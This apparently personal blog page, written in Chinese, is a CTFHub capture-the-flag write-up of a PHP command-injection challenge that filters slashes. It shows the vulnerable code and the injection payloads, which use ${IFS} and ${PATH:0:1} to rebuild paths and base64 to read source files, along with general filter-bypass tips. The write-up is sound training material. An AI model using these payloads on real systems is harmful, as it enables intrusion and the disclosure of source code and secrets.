@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-RCE 命令注入-过滤目录分隔符 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+        .note { background-color: #fff5b1; padding: 10px; border-left: 5px solid #f1c40f; margin: 15px 0; border-radius: 3px; font-size: 0.95em; }
+        table { width: 100%; border-collapse: collapse; margin-top: 15px; font-size: 0.95em; }
+        th, td { border: 1px solid #dfe2e5; padding: 8px 12px; text-align: left; }
+        th { background-color: #f6f8fa; }
+        a { color: #0366d6; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-RCE 命令注入-过滤目录分隔符 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, RCE, 命令注入, 过滤斜杠, PATH环境变量截取</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - RCE / 命令注入</li>
+        <li><strong>题目名称：</strong>过滤目录分隔符</li>
+        <li><strong>环境：</strong>浏览器 + 输入框提交。</li>
+        <li><strong>目标：</strong>在斜杠 <code>/</code> 被过滤的情况下，利用环境变量截取，拼接路径并读取目标文件。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>Linux 环境变量截取（<code>${PATH:0:1}</code>）与 base64 源码读取。</p >
+    
+    <div class="diff-box">
+        <strong>知识点（比喻说明）：</strong>
+        <ul>
+            <li><strong>绕过目录分隔符：</strong> 服务器过滤了斜杠 <code>/</code>。我们要像变魔术一样，凭空“变”出一个斜杠。Linux 的 <code>$PATH</code> 环境变量（例如 <code>/usr/local/sbin:...</code>）的第一个字符刚好就是斜杠。通过 <code>${PATH:0:1}</code> 截取第一个字符，即可完美替代 <code>/</code>。</li>
+            <li><strong>cd 命令的失效：</strong> 在 PHP 的 <code>exec()</code> 中，每次执行命令都会开启一个新的子进程。用 <code>cd</code> 切换目录只在当前子进程有效，无法影响后续命令，所以直接拼接相对路径才是最稳妥的方案。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计与漏洞定位</h3>
+        <pre><code>&lt;?php
+if (isset($_GET['ip']) && $_GET['ip']) {
+    $ip = $_GET['ip'];
+    $m = [];
+    if (!preg_match_all("/\//", $ip, $m)) {
+        $cmd = "ping -c 4 {$ip}";
+        exec($cmd, $res);
+    } else {
+        $res = $m;
+    }
+}
+?&gt;</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>preg_match_all("/\//", $ip, $m)</code>：过滤了斜杠字符 <code>/</code>。</li>
+            <li>没有过滤空格，所以我们可以直接用空格或 <code>${IFS}</code>。</li>
+        </ul>
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：探测真实目标目录</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1;ls</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>发现当前目录下存在 <code>flag_is_here</code> 和 <code>index.php</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>目标目录名为 <code>flag_is_here</code>，且位于相对路径下。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：进入目录查看内部文件</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1;ls${IFS}flag_is_here</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">回显结果：</span>发现真正目标文件为 <code>flag_32623325639701.php</code>。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：拼接路径，使用 base64 读取源码</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>127.0.0.1;base64${IFS}flag_is_here${PATH:0:1}flag_32623325639701.php</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span><code>${PATH:0:1}</code> 会被解析为斜杠，拼接出正确路径 <code>flag_is_here/flag_32623325639701.php</code>。使用 base64 避免内容被 PHP 解析器“隐形”。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>得到 Base64 字符串 <code>PD9waHAgLy8gY3RmaHViezkyNjU2NThkOTBjZmM5MTQyNGY5MmJiZ... </code></p >
+        <p class="info-line"><span class="info-label">操作：</span> 将字符串复制到在线工具 <a href="https://base64.us" target="_blank">https://base64.us</a> 进行解码。</p >
+        <p class="info-line"><span class="info-label">解码结果：</span><code>&lt;?php // ctfhub{9265658d90cfc91424f92bbe}</code></p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><b>尝试直接读取 /flag 导致无回显：</b> 误以为 Flag 在根目录下，使用 <code>cat${IFS}${PATH:0:1}flag</code> 却毫无回显。使用 <code>2>&1</code> 排错后发现根目录根本没有 <code>/flag</code> 目录。教训：必须先用 <code>ls</code> 一级一级确认路径，不能盲目猜测。</li>
+        <li><b>cd 命令失效的陷阱：</b> 尝试用 <code>127.0.0.1;cd${IFS}flag_is_here;ls</code> 进入目录，发现没有任何输出。原因是 PHP 的 <code>exec()</code> 函数每次执行都在新的子进程中，<code>cd</code> 无法影响后续命令。教训：在命令注入中，直接使用相对路径（如 <code>ls dir</code>）比依赖 <code>cd</code> 更可靠。</li>
+        <li><b>关于 /**/ 替代空格的误区（延续上一关）：</b> 这是典型的 SQL 注入思维。在 Linux Shell 中，<code>/</code> 和 <code>*</code> 会被识别为路径和通配符，无法替代空格。命令注入中替代空格必须用 <code>${IFS}</code> 或 <code>&lt;</code>。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>环境变量截取神器：</strong> <code>${PATH:0:1}</code> 和 <code>${PWD:0:1}</code> 都是完美的斜杠替代品，能在过滤 <code>/</code> 时起到决定性作用。</li>
+        <li><strong>Web 读源码的黄金组合：</strong> 当读取 <code>.php</code> 后缀的文件时，优先使用 <code>base64</code> 命令编码，再拿到本地解码，这是防止源码被 HTML 解析隐藏的最佳实践。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
